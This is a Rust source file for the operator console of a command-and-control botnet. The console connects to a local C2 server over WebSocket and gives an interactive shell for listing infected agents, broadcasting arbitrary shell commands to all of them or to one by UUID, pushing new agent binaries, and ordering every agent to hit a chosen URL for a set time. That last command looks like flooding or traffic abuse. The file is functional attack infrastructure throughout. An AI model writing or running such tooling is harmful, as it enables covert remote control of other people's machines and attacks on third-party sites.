use crate::handlers::models::{Agent, C2Message};
use futures::{SinkExt, StreamExt};
use reqwest::Client;
use serde_json::{Value, json};
use std::fs;
use std::process::Command;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::protocol::Message as WsMessage;
use tokio_tungstenite::{WebSocketStream, connect_async};
use warp::ws::Message;

type WebSocketWrite = futures::stream::SplitSink<
    WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
    WsMessage,
>;

pub struct Operator {
    client: Client,
    ws_sender: mpsc::Sender<Message>,
    response_receiver: mpsc::Receiver<(String, Value, usize, usize)>,
    ws_write: Arc<tokio::sync::Mutex<WebSocketWrite>>,
}

impl Operator {
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let client = Client::new();
        let (ws_stream, _) = connect_async("ws://localhost:80/c2").await?;
        let (write, mut read) = ws_stream.split();

        let (tx, mut rx) = mpsc::channel::<Message>(100);
        let (response_tx, response_rx) = mpsc::channel::<(String, Value, usize, usize)>(100);

        let ws_write = Arc::new(tokio::sync::Mutex::new(write));

        let ws_write_send = ws_write.clone();
        let ws_write_clone = ws_write.clone();

        tokio::spawn(async move {
            while let Some(msg) = read.next().await {
                match msg {
                    Ok(msg) => {
                        if let Ok(text) = msg.into_text() {
                            if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                                match c2_msg {
                                    C2Message::AgentList {
                                        agents,
                                        total,
                                        online,
                                    } => {
                                        let _ = response_tx
                                            .send((
                                                "list".to_string(),
                                                serde_json::to_value(&agents)
                                                    .map_err(|e| {
                                                        format!("Serialization error: {}", e)
                                                    })
                                                    .unwrap_or(json!({})),
                                                total,
                                                online,
                                            ))
                                            .await;
                                    }
                                    C2Message::AgentStatus { uuid, online } => {
                                        let _ = response_tx
                                            .send((
                                                "status".to_string(),
                                                json!({ "uuid": uuid, "online": online }),
                                                0,
                                                0,
                                            ))
                                            .await;
                                    }
                                    C2Message::AgentDetails { agent } => {
                                        let _ = response_tx
                                            .send((
                                                "details".to_string(),
                                                serde_json::to_value(&agent)
                                                    .map_err(|e| {
                                                        format!("Serialization error: {}", e)
                                                    })
                                                    .unwrap_or(json!({})),
                                                0,
                                                0,
                                            ))
                                            .await;
                                    }
                                    C2Message::CommandResponse { output } => {
                                        let _ = response_tx
                                            .send((
                                                "response".to_string(),
                                                json!({ "output": output }),
                                                0,
                                                0,
                                            ))
                                            .await;
                                    }
                                    _ => {}
                                }
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("WebSocket read error: {}", e);
                        break;
                    }
                }
            }
            let mut write = ws_write.lock().await;
            if let Err(e) = write.close().await {
                eprintln!("Error closing WebSocket: {}", e);
            }
        });

        tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                let ws_msg = match msg.to_str() {
                    Ok(text) => {
                        WsMessage::Text(text.to_string())
                    }
                    Err(e) => {
                        eprintln!("Message error: {:?}", e);
                        break;
                    }
                };
                let mut write = ws_write_send.lock().await;
                if let Err(e) = write.send(ws_msg).await {
                    eprintln!("WebSocket send error: {}", e);
                    break;
                }
            }
        });

        Ok(Operator {
            client,
            ws_sender: tx,
            response_receiver: response_rx,
            ws_write: ws_write_clone,
        })
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut stdout = tokio::io::stdout();
        let stdin = BufReader::new(tokio::io::stdin());
        let mut lines = stdin.lines();

        print_banner();
        stdout.write_all(b"\nc2> ").await?;
        stdout.flush().await?;

        loop {
            tokio::select! {
                line = lines.next_line() => {
                    let line = match line? {
                        Some(line) => line.trim().to_string(),
                        None => break, // Sai do loop se stdin for fechado (ex.: EOF)
                    };

                    if line.is_empty() {
                        stdout.write_all(b"\nc2> ").await?;
                        stdout.flush().await?;
                        continue;
                    }

                    let parts: Vec<&str> = line.split_whitespace().collect();
                    match parts[0].to_lowercase().as_str() {
                        "list" => {
                            self.list().await?;
                            tokio::time::sleep(Duration::from_millis(100)).await;
                        }
                        "access" => {
                            if parts.len() == 3 {
                                if let Ok(secs) = parts[2].parse::<u64>() {
                                    self.access(parts[1], secs).await?;
                                } else {
                                    println!("Error: <secs> must be a number.");
                                }
                            } else {
                                println!("Usage: access <url> <secs>");
                            }
                        }
                        "broadcast" => {
                            if parts.len() >= 2 {
                                let cmd = parts[1..].join(" ");
                                self.broadcast(&cmd).await?;
                            } else {
                                println!("Usage: broadcast <cmd>");
                            }
                        }
                        "command" => {
                            if parts.len() >= 3 {
                                let uuid = parts[1].to_string();
                                let cmd = parts[2..].join(" ");
                                self.command(&uuid, &cmd).await?;
                            } else {
                                println!("Usage: command <uuid> <cmd>");
                            }
                        }
                        "agent-software-update" => {
                            if parts.len() == 3 {
                                let version = parts[1].to_string();
                                let file_path = parts[2].to_string();
                                self.agent_software_update(&version, &file_path).await?;
                            } else {
                                println!("Usage: agent-software-update <version> <file_path>");
                            }
                        }
                        "clear" => {
                            if cfg!(target_os = "windows") {
                                Command::new("cls").status().expect("Error running command.");
                            } else {
                                Command::new("clear").status().expect("Error running command.");
                            }
                        }
                        "exit" => {
                            println!("Exiting shell...");
                            let mut write = self.ws_write.lock().await;
                            if let Err(e) = write.close().await {
                                eprintln!("Error closing WebSocket: {}", e);
                            }
                            break;
                        }
                        "help" => {
                            println!("Available commands:");
                            println!("  list                  - List all agents");
                            println!("  access <url> <secs>   - Order agents to access a URL for <secs> seconds");
                            println!("  broadcast <cmd>       - Send a command to all agents");
                            println!("  command <uuid> <cmd>  - Send a command to a specific agent");
                            println!("  agent-software-update <version> <file_path> - Update agent software with binary from file");
                            println!("  clear                 - Clear the terminal");
                            println!("  exit                  - Quit the shell");
                            println!("  help                  - Show this help");
                        }
                        _ => {
                            println!("Unknown command: {}. Type 'help' for commands.", parts[0]);
                        }
                    }
                    stdout.write_all(b"\nc2> ").await?;
                    stdout.flush().await?;
                }
                Some((kind, value, total, online)) = self.response_receiver.recv() => {
                    match kind.as_str() {
                        "list" => {
                            let agents: Vec<Agent> = serde_json::from_value(value)
                                .map_err(|e| format!("Deserialization error: {}", e))?;
                            for agent in &agents {
                                println!("{}", agent);
                            }
                            println!("\n[+] {total} registered agents ({online} online).");
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        "details" => {
                            if let Ok(agent) = serde_json::from_value::<Option<Agent>>(value) {
                                if let Some(agent) = agent {
                                    println!("Found agent: {}. Enter commands (type 'exit' to stop):", agent.uuid);
                                } else {
                                    println!("Agent not found.");
                                }
                            }
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        _ => {}
                    }
                }
            }
        }
        Ok(())
    }

    async fn list(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let msg = serde_json::to_string(&C2Message::RequestAgentList)?;
        self.ws_sender.send(Message::text(msg)).await?;
        Ok(())
    }

    async fn access(&self, url: &str, secs: u64) -> Result<(), Box<dyn std::error::Error>> {
        if !url.starts_with("http://") && !url.starts_with("https://") {
            return Err("Invalid URL: must start with http:// or https://".into());
        }
        let access_cmd = json!({
            "action": "access",
            "url": url,
            "duration_secs": secs
        })
        .to_string();
        let broadcast_msg = serde_json::to_string(&C2Message::Broadcast { cmd: access_cmd })?;
        self.ws_sender.send(Message::text(broadcast_msg)).await?;
        println!("Ordered all agents to access {} for {} seconds", url, secs);
        Ok(())
    }

    async fn broadcast(&self, cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let broadcast_msg = serde_json::to_string(&C2Message::Broadcast {
            cmd: cmd.to_string(),
        })?;
        self.ws_sender.send(Message::text(broadcast_msg)).await?;
        println!("Broadcasted command: {}", cmd);
        Ok(())
    }

    async fn command(&self, uuid: &str, cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let command_msg = serde_json::to_string(&C2Message::Command {
            uuid: uuid.to_string(),
            cmd: cmd.to_string(),
        })?;
        self.ws_sender.send(Message::text(command_msg)).await?;
        println!("Sent command to agent {}: {}", uuid, cmd);
        Ok(())
    }

    async fn agent_software_update(
        &self,
        version: &str,
        file_path: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let binary = fs::read(file_path)?;
        let msg = serde_json::to_string(&C2Message::AgentSoftwareUpdateWithBinary {
            version: version.to_string(),
            binary,
        })?;
        self.ws_sender.send(Message::text(msg)).await?;
        println!("Sent agent software update command: version={}", version);
        Ok(())
    }
}

fn print_banner() {
    println!(
        r#"
                                                          
          @                                               
         @@@@ @                                           
        %@@@@@@@%                                         
         @@@@@@@@@@@                                      
       %%%%@@@@@@@@@@%%%%                                 
        %%%@%%@@@@@@@@@%%%%%        # ##****%             
         %@%%%@@%@@@@@@@@%%%%%  %%%#####%##%#             
           %%%@@@%@@@@@@@@@@@%#%###%%@%%%%%%#*            
            %%%%%%%%%%@@@@@@@@@%#%%@@%%%@@%%@%#           
              %%%%%%%%%@@@@@@@@%%%@%%%%%%@@@@@@#          
              %#%%%%#%%%%%%%%%%%%%%%##%%%@   @@@          
                  *****####%%%%%%%%%##*#%%                
                    *+++***##%%%%%%%##***#                
                   ++++=++*%%%%%%%%%%%%%%%@               
              *****###%###%%%@@@@%%@%###@@@               
             %%@%%%%%%%%%%%%@%@@@@@@@%@@@@%%@@@%%         
            %@@@%@@@%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@        
           %@@@@@@@@@%@@@@@@@@@@@%%          @@ @@        
         %%@@@@% @@@@@@@@@                  @@  @@        
        %%@@@%%@@@@@@@@@@               @@@@@@ @@@        
       %%@@@@@@@@@@@@@%                       @@@         
      %%@@%%@@   @@@@                                     
    %%@@%%%@@   @@@@                                      
   @%%%%%%%@     @@@                                      
   @%@ @%%@       @%@                                     
       %%@         %%%                                    
                     %%%                                  
                                                          
                                                          
                ██▄   ████▄ █▀▄▀█ ▄█    ▄  ▄█ 
                █  █  █   █ █ █ █ ██     █ ██ 
                █   █ █   █ █ ▄ █ ██ ██  █ ██ 
                █  █  ▀████ █   █ ▐█ █ █ █ ▐█ 
                ███▀           █   ▐ █  ██  ▐ 
                              ▀      █  ██    
                              
"#
    );
}
